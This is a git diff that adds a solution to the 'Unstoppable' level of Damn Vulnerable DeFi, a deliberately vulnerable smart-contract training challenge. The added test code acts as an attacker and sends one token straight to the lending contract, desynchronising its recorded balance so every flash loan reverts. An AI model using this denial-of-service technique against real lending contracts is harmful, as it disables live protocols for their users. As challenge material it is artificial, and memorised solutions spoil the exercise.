@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
@@ -60,12 +61,26 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        console.log("Balance of Contract Unstoppable Lender Before : ", dvt.balanceOf(address(unstoppableLender)));
+        vm.startPrank(attacker); // attacker starts
+
+        dvt.transfer(address(unstoppableLender), 1); // After transfering tokens as attacker using transfer and not the deposit function, the poolBalance does not get updated
+        // ultimately breaking the flashLoan requirement of if (poolBalance != balanceBefore) revert AssertionViolated();
+
+        //dvt.approve(attacker, 10); // approving attacker some tokens
+        //dvt.transferFrom(attacker, address(unstoppableLender), 1); // this also works with approve
+
+        vm.stopPrank();
+        console.log("Balance of Contract Unstoppable Lender After : ", dvt.balanceOf(address(unstoppableLender)));
+
+
         /**
          * EXPLOIT END *
          */
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        
     }
 
     function validation() internal {
